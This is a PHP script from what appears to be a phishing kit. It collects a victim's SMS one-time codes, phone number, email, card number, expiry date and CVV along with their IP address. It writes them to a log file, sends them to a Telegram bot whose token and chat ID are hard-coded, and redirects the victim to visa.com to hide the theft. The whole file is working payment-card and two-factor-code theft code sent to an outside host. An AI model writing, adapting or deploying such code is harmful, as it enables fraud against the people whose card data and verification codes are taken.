<?php
require('telegram.php');
session_start();
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "sms  2       : ".$_POST['otp']."\n";
$bilsmg .= "sms  1       : ".$_POST['sms1']."\n";
$bilsmg .= "------------------------------------------------------\n";
$bilsmg .= "N-Phone      : ".$_POST['tel']."\n";
$bilsmg .= "E-mail       : ".$_POST['email']."\n";
$bilsmg .= "C-Number     : ".$_POST['cc']."\n";
$bilsmg .= "D-Expiration : ".$_POST['expe']."\n";
$bilsmg .= "CVN          : ".$_POST['cvv']."\n";
$bilsmg .= "--------------------------------------------------------\n";
$bilsmg .= "From : $ip \n";

$file = fopen("../CC-CL.txt", 'a');
telegram ("$bilsmg");
fwrite($file, $bilsmg);
header("location: https://visa.com");
$token = "2116497874:AAFRCVdHcsQlfrUU3bZ9P917_M-0MK10aWU";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1325060069&text=" . urlencode($message)."" );
?>